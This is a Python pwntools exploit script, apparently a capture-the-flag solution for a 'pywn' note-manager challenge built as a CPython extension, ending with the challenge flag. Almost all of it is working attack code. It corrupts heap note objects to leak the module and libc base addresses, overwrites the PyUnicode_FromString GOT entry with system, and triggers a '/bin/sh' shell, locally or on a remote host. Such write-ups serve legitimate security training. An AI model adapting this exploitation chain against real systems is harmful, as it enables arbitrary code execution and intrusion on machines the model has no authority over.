#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or '', checksec=False)
# libc = exe.libc
context.terminal = ["tmux", "splitw", "-h"]
# context.encoding = 'utf-8'

gdbscript = '''
tbreak main
continue
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or ''
    port = int(args.PORT or 0)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
rotate_left = lambda x, a, s=64: (x << a) | (x >> (s-a))
rotate_right = lambda x, a, s=64: (x >> a) | (x << (s-a))
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rotate_left(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: rotate_right(addr, 17) ^ cookie
logleak = lambda **k: [success(f"{k}: {v:#x}") for k, v in k.items()]
has_space       = lambda data: any(c in {0x20, 0x09, 0x0a, 0x0b, 0x0c, 0x0d} for c in data)
is_scanf_safe   = lambda data: not has_space(data)
is_stream_safe  = lambda data: not has_space(data)
is_cin_safe     = lambda data: not has_space(data)
is_fgets_safe   = lambda data: (b'\n' not in data)
is_gets_safe    = lambda data: is_fgets_safe(data)
is_getline_safe = lambda data: is_fgets_safe(data)


def trace(func):
    def wrapper(*args, **kwargs):
        info(f"{func.__name__} {args} {kwargs}")
        return func(*args, **kwargs)
    return wrapper


def create(name, records = []):
    sla(b' do now?', b'1')
    sla(b'name> ', name)
    sla(b'records (single line, space-separated)> ', ' '.join(map(str, records)).encode())

    note_id = rl().decode().strip().split()[-1]
    note_id = int(note_id)
    info(f'Created a new note at index {note_id:#x}')
    return note_id

def delete(idx):
    sla(b' do now?', b'2')
    sla(b'note id> ', str(idx).encode())

def print_note(idx):
    sla(b' do now?', b'3')
    sla(b'note id> ', str(idx).encode())

def leak_addr():
    parts = rl().decode().split(": ")
    best = int(parts[2].split(";")[0])
    worst = u32(p32(int(parts[3]), signed=True))
    info(f"best: {best:#x}, worst: {worst:#x}")

    if hex(worst).startswith("0x7"):
        ret = (worst << 32) | best
    else:
        ret = (best << 32) | worst
    return ret


# f0 90 84 b7 
char_4b = "𐄷".encode()
if "cert" not in args.HOST:
    sleep(4)



idx0 = create(char_4b * 0x18)
delete(idx0)

idx1 = create(b"A" * 0x100)
delete(idx1)
logleak(idx1=idx1)

idx2 = create(b"/bin/sh\x00")

leaker = create(b"C" * 0x100)

just_rw_mem = idx1 + 0x1000
s = "D" * 0x100
overwriter = create(s.encode(), [0x1d]*8+[
    # C
    idx1 & 0xffffffff, (idx1 >> 32) & 0xffffffff, # name
    2, 0, # records num
    idx1+8 & 0xffffffff, (idx1+8 >> 32) & 0xffffffff, # records ptr
    0x1337, 0x1338, # garbage
    just_rw_mem & 0xffffffff, (just_rw_mem >> 32) & 0xffffffff, # unused
])

print_note(leaker)

NoteType_addr = leak_addr()
logleak(pywn_leak=NoteType_addr)

delete(overwriter)

pywn_mod = ELF("./pywn.cpython-314-x86_64-linux-gnu.so")
pywn_mod.address = NoteType_addr - pywn_mod.symbols["NoteType"]
PyUnicode_FromString = pywn_mod.got["PyUnicode_FromString"]
sched_getaffinity = pywn_mod.got["sched_getaffinity"]

info("pywn_mod base: %#x" % pywn_mod.address)
info("PyUnicode_FromString[got]: %#x" % PyUnicode_FromString)
info("sched_getaffinity[got]: %#x" % sched_getaffinity)


just_writable = PyUnicode_FromString + 0x200
overwriter = create(b"E" * 0x100, [0x1d]*8+[
    # C
    just_writable & 0xffffffff, (just_writable >> 32) & 0xffffffff, # name
    2, 0, # records num
    sched_getaffinity & 0xffffffff, (sched_getaffinity >> 32) & 0xffffffff, # records ptr
    0x1337, 0x1338, # garbage
    # D name needs to point somewhere to GOT imho; works but have to do after pywn module leak
    PyUnicode_FromString & 0xffffffff, (PyUnicode_FromString >> 32) & 0xffffffff, # name
])

print_note(leaker)

sched_getaffinity_leak = leak_addr()
logleak(sched_getaffinity_leak=sched_getaffinity_leak)

libc = ELF("./libc.so.6")
libc.address = sched_getaffinity_leak - libc.symbols["sched_getaffinity"]
libc_system = libc.symbols["system"]
logleak(libc_system=libc_system, libc_base=libc.address)

delete(overwriter)

s = "F" * 0x100
idx4 = create(s.encode(), [libc_system & 0xffffffff, (libc_system >> 32) & 0xffffffff])

print_note(idx2)

ia()

# ecsc26{r0ses_4re_r3d_vi0lets_ar3_blu3_1_r4n_out_0f_id3as_f0r_fl4gs_AAAAAA!!}